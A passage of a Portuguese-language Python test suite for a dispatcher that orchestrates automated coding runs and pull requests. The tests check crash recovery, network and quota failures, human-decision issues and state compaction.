        self.assertEqual([t for t, _ in self.forja.decisoes], ["[fábrica] Warren inacessível"])
        self.terminar_revisao(H1)  # o run original termina bem e ainda é observado
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])
        self.assertEqual(len(self.runs(OPUS)), 1)

    def test_i1_queda_longa_mantem_orquestrador_e_fixer_originais(self):
        self.motor = MotorForaDoAr()
        d, orq = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.motor.definir_plano("plano-2", "running", [{"seedId": "s-b", "estado": "pr_open", "runId": "rb", "prUrl": PR}])
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-b", arquivos=["src/b/x.ts"])
        self.forja.definir_ci(REPO, H1, "vermelho")
        d.ciclo()
        rid = self.estado()["seeds"]["s-b"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, veredito_texto(H1))
        d.ciclo()
        fixer = self.estado()["seeds"]["s-b"]["fixerRunId"]
        self.assertTrue(fixer)
        self.motor.fora = True
        for _ in range(12):
            d.ciclo()
        e = self.estado()
        self.assertEqual((e["orquestrador"]["runId"], e["seeds"]["s-b"]["fixerRunId"]), (orq, fixer))
        self.assertIsNone(e["pausado"])
        self.assertNotIn(e["seeds"]["s-b"]["estado"], ("falhou", "bloqueada_humano"))
        self.motor.fora = False
        self.motor.definir_run(orq, estado="succeeded")  # termina sem PR: segue o fluxo normal
        self.motor.definir_run(fixer, estado="succeeded")
        d.ciclo()
        d.ciclo()
        self.assertNotEqual(self.estado()["orquestrador"]["runId"], orq)
        self.assertIsNone(self.estado()["seeds"]["s-b"]["fixerRunId"])
        self.assertIsNone(self.estado()["warrenFora"]["url"])

    def test_i1_despacho_com_falha_de_rede_e_adiado(self):
        class MotorRedeInstavel(motor.MotorFalso):
            falhas = 1

            def despachar_plano(self, **argumentos):
                if self.falhas:
                    self.falhas -= 1
                    self._registrar("despachar_plano", **argumentos)
                    raise motor.FalhaDeRede("POST /plan-runs: falha de rede (TimeoutError)")
                return super().despachar_plano(**argumentos)

        self.motor = MotorRedeInstavel()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "planejada")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        linha = [x for x in self.log() if x.get("evento") == "acao"][0]
        self.assertEqual(linha["resultado"], {"adiado": True, "rede": True})

    # ------------------------------------------------ I2: queda em cada gravação
    def _queda_em_cada_gravacao(self, preparar, agir, verificar, maximo=14):
        original = despachante.gravar_json_atomico
        for modo in ("antes", "depois"):
            for k in range(1, maximo + 1):
                with self.subTest(modo=modo, k=k):
                    self.setUp()
                    ctx = preparar()
                    contagem = {"n": 0}

                    def gravar(caminho, dados, _k=k, _modo=modo):
                        if pathlib.Path(caminho).name == "estado.json":
                            contagem["n"] += 1
                            if contagem["n"] == _k:
                                if _modo == "depois":
                                    original(caminho, dados)
                                raise KeyboardInterrupt
                        return original(caminho, dados)

                    with mock.patch.object(despachante, "gravar_json_atomico", side_effect=gravar):
                        try:
                            agir(ctx)
                        except KeyboardInterrupt:
                            pass
                    outro = self.novo()
                    for _ in range(3):
                        outro.ciclo()
                    verificar(ctx)

    def _abertas(self, trecho):
        return [u for u, (t, _) in zip(self.forja._decisoes, self.forja.decisoes) if trecho in t and not self.forja._decisoes[u]["fechada"]]

    def test_i2_aguardar_humano_sem_perda_nem_duplicata(self):
        def preparar():
            d = self.preparar_raia()
            self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
            d.ciclo()
            self.terminar_revisao(H1)
            return d

        def verificar(_):
            abertas = self._abertas("s-1: decisão")
            self.assertEqual(len(abertas), 1)
            self.assertEqual([x["url"] for x in self.estado()["decisoes"] if x["alvo"] == "s-1"], abertas)
            self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
            self.assertEqual(self.estado()["decisoesPendentes"], [])

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)

    def test_i2_issue_de_pausa_sem_perda_nem_duplicata(self):
        def preparar():
            d = self.preparar_raia()
            self.abrir_pr(H1)
            d.ciclo()
            rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
            self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
            self.motor.definir_texto(rid, "quota reached")
            return d

        def verificar(_):
            abertas = self._abertas("despachante pausado")
            self.assertEqual(len(abertas), 1)
            self.assertEqual(self.estado()["decisaoPausa"]["url"], abertas[0])

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)

    def test_i2_issue_de_bloqueio_sem_perda_nem_duplicata(self):
        def preparar():
            d, rid = self.acordar_por_falha()
            self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
            self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
            return d

        def verificar(_):
            abertas = self._abertas("sem plano válido")
            self.assertEqual(len(abertas), 1)
            self.assertEqual(self.orquestrador()["bloqueio"]["url"], abertas[0])
            self.assertIn(abertas[0], [x["url"] for x in self.estado()["decisoes"]])
            self.assertEqual(len(self.runs(FABLE)), 2)

        self._queda_em_cada_gravacao(preparar, lambda d: d.ciclo(), verificar)


    def test_i1_falha_de_rede_de_um_run_nunca_conta_para_ele(self):
        class MotorRedeNoRun(motor.MotorFalso):
            alvo = None

            def run(self, run_id):
                if run_id == self.alvo:
                    self._registrar("run", run_id=run_id)
                    raise motor.FalhaDeRede("GET /runs/x: falha de rede (TimeoutError)")
                return super().run(run_id)

        self.motor = MotorRedeNoRun()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.alvo = rid
        for _ in range(8):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        self.assertEqual(len(self.runs(OPUS)), 1)

    def test_i1_sem_nenhuma_leitura_boa_nada_vira_failed(self):
        self.motor = MotorLeituraFalha()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.todos = True  # HTTP 500 em tudo: nenhuma leitura deu certo
        for _ in range(8):
            d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["revisaoRunId"], rid)
        self.assertEqual(len(self.runs(OPUS)), 1)
        self.assertEqual([t for t, _ in self.forja.decisoes], ["[fábrica] Warren inacessível"])

    def test_i2_intencao_de_pausa_obsoleta_fecha_a_issue_achada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        original = d._registrar_intencao

        def cair(*a, **k):
            raise KeyboardInterrupt

        d._registrar_intencao = cair
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()  # a issue de pausa foi aberta; o registro, não
        (url,) = self._abertas("despachante pausado")
        despachante.retomar(self.raiz)  # a pausa acabou por outro caminho antes do reinício
        outro = self.novo()
        outro.ciclo()
        self.assertTrue(self.forja.decisao(url)["fechada"])
        self.assertEqual(self.estado()["decisoesPendentes"], [])
        self.assertIsNone(self.estado().get("decisaoPausa"))
        del original

    def test_i5_prs_das_seeds_tiradas_pelo_replanejamento_de_raia_falha_sao_fechados(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.motor.definir_plano("plano-1", "failed", [{"seedId": "s-1", "estado": "pr_open", "runId": "run-filho", "prUrl": PR}], falha="run_failed")
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/plano.json"])
        self.forja.definir_ci(REPO, H3, "verde")
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")), ref=H3)
        d.ciclo()
        d.ciclo()
        self.assertNotIn("s-1", self.estado()["seeds"])
        self.assertIn(PR, [u for u, _ in self.forja.fechados])

    # ------------------------------------------------ I3
    def test_i3_substituicao_pendente_segura_gates_e_retomar_da_tentativa_antiga(self):
        class MotorCancelaLotado(motor.MotorFalso):
            recusas = 4

            def cancelar_plano(self, plan_run_id):
                if self.recusas:
                    self.recusas -= 1
                    self._registrar("cancelar_plano", plan_run_id=plan_run_id)
                    raise motor.MotorOcupado(30)
                return super().cancelar_plano(plan_run_id)

        self.motor = MotorCancelaLotado()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        self.terminar_revisao(H1)
        d.estado["raias"]["a"]["retomar"] = True
        d._salvar()
        revisoes = len(self.runs(OPUS))
        for _ in range(4):
            acoes = d.ciclo()
            self.assertFalse([a for a in acoes if a["tipo"] in ("mergear", "revisar", "verificar", "corrigir", "retomar_raia")])
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.runs(OPUS)), revisoes)
        self.assertNotIn("retomar_plano", [n for n, _ in self.motor.chamadas])
        self.assertEqual(len([n for n, _ in self.motor.chamadas if n == "cancelar_plano"]), 4)
        d.ciclo()
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00b2")
        self.assertEqual(self.forja.merges, [])

    # ------------------------------------------------ I4
    def test_i4_bloqueio_fechado_sem_comentario_acorda_com_resposta_vazia(self):
        d, _ = self.acordar_por_falha()
        for _ in range(3):
            rid = self.orquestrador()["runId"]
            if rid:
                self.motor.definir_run(rid, estado="succeeded")
            d.ciclo()
        url = self.orquestrador()["bloqueio"]["url"]
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(url, fechada=True)
        d.ciclo()
        self.assertIsNone(self.orquestrador()["bloqueio"])
        self.assertEqual(len(self.runs(FABLE)), n + 1)
        ultimo = self.runs(FABLE)[-1]["prompt"]
        self.assertIn("Motivo: resposta_paulo", ultimo)
        self.assertIn('"resposta": ""', ultimo)

    # ------------------------------------------------ I5
    def test_i5_seed_reaproveitada_pelo_plano_novo_e_revisada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        d.ciclo()
        novo_plan_run = self.estado()["raias"]["a"]["planRunId"]
        pr7 = "https://github.com/dono/cliente/pull/77"
        self.motor.definir_plano(novo_plan_run, "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "ra2", "prUrl": pr7}])
        self.forja.definir_pr(pr7, head_sha=H2, branch="warren/s-1-2", arquivos=["src/a/x.ts"])
        self.forja.definir_ci(REPO, H2, "verde")
        d.ciclo()
        self.assertEqual(self.runs(OPUS)[-1]["branch_existente"], "warren/s-1-2")
        self.assertEqual(self.estado()["seeds"]["s-1"]["pr"], pr7)

    # ------------------------------------------------ J
    def test_j_cota_num_filho_pausa_e_a_raia_continua_depois_do_retomar(self):
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed"
        )
        self.motor.definir_texto("rf", "API Error: usage limit reached")
        d.ciclo()
        e = self.estado()
        self.assertEqual(e["pausado"], "cota")
        self.assertEqual((e["raias"]["a"]["estado"], e["raias"]["a"]["retomar"]), ("executando", True))
        self.assertEqual(self.runs(FABLE), [])
        d.ciclo()
        self.forja.definir_decisao(self.estado()["decisaoPausa"]["url"], fechada=True)
        d.ciclo()
        self.assertIn(("retomar_plano", {"plan_run_id": "plano-1"}), self.motor.chamadas)
        self.assertEqual(self.estado()["raias"]["a"]["retomadas"], 0)
        self.assertEqual(self.runs(FABLE), [])

    def test_j_falha_de_provedor_que_nao_e_cota_segue_o_caminho_normal(self):
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "failed", [{"seedId": "s-1", "estado": "failed", "runId": "rf", "falha": "provider_error"}], falha="child_failed"
        )
        self.motor.definir_texto("rf", "Internal server error")
        d.ciclo()
        self.assertIsNone(self.estado()["pausado"])
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    # ------------------------------------------------ K
    def test_k_ci_ausente_no_pr_do_orquestrador_mergeia(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="ausente")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])

    # ------------------------------------------------ L1, L2
    def test_l1_queda_depois_do_cancelamento_nao_acorda_o_orquestrador(self):
        class MotorQueCaiNoCancelar(motor.MotorFalso):
            cair = True

            def cancelar_plano(self, plan_run_id):
                super().cancelar_plano(plan_run_id)
                if self.cair:
                    self.cair = False
                    raise KeyboardInterrupt

        self.motor = MotorQueCaiNoCancelar()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        with self.assertRaises(KeyboardInterrupt):
            d.ciclo()
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00b2")
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertEqual(len([c for c in self.motor.chamadas if c[0] == "cancelar_plano"]), 1)

    def test_l2_seed_com_pr_ja_mergeado_fica_mergeada_na_substituicao(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False, mergeado=True)
        self.publicar(plano(raia("a", plano_seeds="pl-00b2")))
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "mergeada")
        self.assertEqual(self.forja.fechados, [])
        self.assertEqual(self.estado()["raias"]["a"]["seedsSubstituidas"], [])

    # ------------------------------------------------ L3, L4
    def test_l3_plano_invalido_com_alvo_estavel_e_resposta_na_frente(self):
        d, rid = self.acordar_por_falha()
        outra = self.forja.abrir_decisao(REPO, "t", "c")
        d.estado["decisoes"].append({"url": outra, "motivo": "pergunta", "alvo": "x"})
        d._salvar()
        self.motor.definir_run(rid, estado="succeeded")
        self.forja.definir_decisao(outra, fechada=True, ultimo_comentario="RESPOSTA")
        d.ciclo()
        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])
        (pendente,) = self.estado()["acordarPendentes"]
        self.assertEqual((pendente["motivo"], pendente["alvo"]), ("plano_invalido", "orquestrador"))

    def test_l3_bloqueio_tira_o_plano_invalido_da_fila(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        # o run termina sem PR no mesmo ciclo em que a raia b falha: raia_falhou:b passa na frente
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        self.assertIn("Motivo: raia_falhou", self.runs(FABLE)[-1]["prompt"])
        self.assertEqual([p["motivo"] for p in self.estado()["acordarPendentes"]], ["plano_invalido"])
        self.motor.definir_run(self.orquestrador()["runId"], estado="succeeded")
        d.ciclo()
        self.assertTrue(self.orquestrador()["bloqueio"])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_l4_queda_depois_de_contar_nao_conta_o_mesmo_run_de_novo(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded")
        with mock.patch.object(despachante.est, "concluir_orquestrador", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                d.ciclo()
        outro = self.novo()
        outro.ciclo()
        self.assertEqual(self.orquestrador()["semResultadoSeguidos"], 1)
        self.assertFalse(self.orquestrador().get("bloqueio"))
        self.assertEqual(len(self.runs(FABLE)), 2)

    # ------------------------------------------------ L5, L6
    def test_l5_issue_de_pausa_sumida_e_aberta_de_novo(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "quota reached")
        d.ciclo()
        velha = self.estado()["decisaoPausa"]["url"]
        del self.forja._decisoes[velha]
        d.ciclo()
        nova = self.estado()["decisaoPausa"]["url"]
        self.assertNotEqual(nova, velha)
        self.assertFalse(self.forja.decisao(nova)["fechada"])

    def test_l6_pedido_que_nao_pode_ser_apagado_nao_e_reaplicado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        despachante.enfileirar_pedido(self.raiz, {"comando": "retomar"})
        os.chmod(self.raiz / "entrada", 0o500)
        try:
            d.ciclo()
            rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
            self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
            self.motor.definir_texto(rid, "quota reached")
            for _ in range(4):
                d.ciclo()
            self.assertEqual(self.estado()["pausado"], "cota")
            self.assertEqual(len(self.runs(OPUS)), 1)
            self.assertEqual(len([a for a in self.estado()["avisos"] if "não foi possível apagar o pedido" in a]), 1)
        finally:
            os.chmod(self.raiz / "entrada", 0o700)

    # ------------------------------------------------ L7, L8, L9, fuso
    def test_l7_ci_pendente_loga_o_pr_do_orquestrador_uma_vez(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        for minuto in range(0, 100, 15):
            self.instante = datetime.datetime(2026, 11, 3, 12, 0) + datetime.timedelta(minutes=minuto)
            d.ciclo()
        self.assertEqual(len([x for x in self.log() if x.get("evento") == "pr_do_orquestrador"]), 1)

    def test_ci_pendente_com_data_de_fuso_misturado_nao_quebra(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), ci="pendente")
        d.ciclo()
        d.estado["orquestrador"]["ciPendenteDesde"] = "2026-11-03T12:00:00+00:00"
        d._salvar()
        d.ciclo()
        self.assertEqual(self.orquestrador()["runId"], rid)
        self.assertNotIn("falhasTratar", self.orquestrador())
        self.assertEqual(self.forja.decisoes, [])

    def test_l8_rodar_recarrega_o_estado_depois_de_tomar_a_trava(self):
        self.publicar(plano(raia("a")))
        primeiro = self.novo()
        primeiro.iniciar()
        segundo = self.novo()  # construído antes do ciclo do primeiro
        primeiro.ciclo()
        segundo.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        self.assertEqual(len(self.planos_despachados()), 1)

    def test_l9_decisao_do_pr_substituido_e_fechada(self):
        d, rid = self.acordar_por_falha(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json", "README.md"], plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        (decisao,) = [x for x in self.estado()["decisoes"] if x["alvo"] == PR_ORQ]
        self.motor.definir_plano("plano-2", "failed", [], falha="cancelado")
        d.ciclo()
        novo = "https://github.com/dono/cliente/pull/91"
        self.pr_do_orquestrador(
            self.orquestrador()["runId"], [".fabrica/plano.json"], plano(raia("a"), raia("b", plano_seeds="pl-00bb")), head=H2, url=novo
        )
        d.ciclo()
        d.ciclo()
        self.assertEqual(self.forja.merges, [(novo, H2)])
        self.assertTrue(self.forja.decisao(decisao["url"])["fechada"])
        self.assertNotIn(decisao["url"], [x["url"] for x in self.estado()["decisoes"]])
        n = len(self.runs(FABLE))
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="pode mergear o 90")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), n)


# ---------------------------------------------------------------- estado compacto


class TestesCompactar(unittest.TestCase):
    def test_compactar_resume_sem_saidas_longas(self):
        estado_ = est.novo_estado(plano(raia("a"), raia("b")), projeto=PROJETO, repo=REPO)
        estado_["raias"]["a"].update(estado="falhou", retomadas=2, falha="child_pr_merge_timeout")
        estado_["seeds"] = {
            "s-1": dict(est._seed_nova("a"), estado="mergeada", pr=PR),
            "s-2": dict(est._seed_nova("a"), estado="bloqueada_humano", pr=PR, motivoHumano="toca protegidos"),
            "s-3": dict(est._seed_nova("b"), estado="em_revisao", pr=PR, verificacao={"saida": "x" * 9000}),
        }
        estado_["avisos"] = [f"aviso {i}" for i in range(25)]
        estado_["pausado"] = "cota"
        c = despachante.compactar(estado_, plano(raia("a"), raia("b")))
        self.assertEqual(c["faseAtual"], "f1")
        self.assertEqual(c["pausado"], "cota")
        self.assertEqual(c["raias"]["a"], {"estado": "falhou", "retomadas": 2, "falha": "child_pr_merge_timeout"})
        self.assertEqual(set(c["seeds"]), {"s-2", "s-3"})
        self.assertEqual(c["seeds"]["s-2"], {"estado": "bloqueada_humano", "pr": PR, "motivos": ["toca protegidos"]})
        self.assertEqual(c["avisos"], [f"aviso {i}" for i in range(15, 25)])
        self.assertLess(len(json.dumps(c)), 2000)

    def test_compactar_nao_muta_a_entrada(self):
        estado_ = est.novo_estado(plano(raia("a")), projeto=PROJETO, repo=REPO)
        antes = copy.deepcopy(estado_)
        despachante.compactar(estado_, plano(raia("a")))
        self.assertEqual(estado_, antes)


if __name__ == "__main__":
    unittest.main()
